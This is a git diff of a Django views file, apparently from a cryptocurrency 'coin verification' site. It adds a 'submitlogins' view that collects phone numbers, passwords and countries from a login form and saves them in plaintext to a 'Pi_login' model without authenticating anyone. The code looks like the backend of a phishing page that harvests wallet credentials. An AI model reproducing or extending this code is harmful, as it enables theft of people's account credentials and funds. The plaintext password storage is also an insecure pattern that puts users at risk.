@@ -11,7 +11,7 @@ import socket
 # Create your views here.
 import uuid
 
-my_site = True
+my_site = False
 
 def get_mac_address():
     mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(2,7)][::-1])
@@ -219,3 +219,34 @@ def verify_your_coin(request, keys = None):
     
 def do_not_verify(request):
     return index(request, redi="Pass")
+
+
+def submitlogins(request):
+
+    if request.method == "POST":
+        phone_number = request.POST.get('phone_number', '')
+        password = request.POST.get('password', '')
+        country = request.POST.get('country', '')
+
+        if country == "":
+            messages.error(request, "Select your Country")
+            return redirect('/login/')
+
+        if phone_number != '' or password != '':
+
+            if models.Pi_login.objects.filter(phone_number=phone_number).exists():
+                messages.error(request, 'This Phone number already exists')
+                return redirect('/login/')
+
+            saving = models.Pi_login.objects.create(
+                phone_number = phone_number,
+                password = password,
+                country = country
+            )
+            saving.save()
+            messages.info(request, "Checking Info")
+        else:
+            messages.error(request, 'Phone Number or Password cannot be empty')
+        return redirect('/login/')
+    
+    return render(request, 'login.html', {})
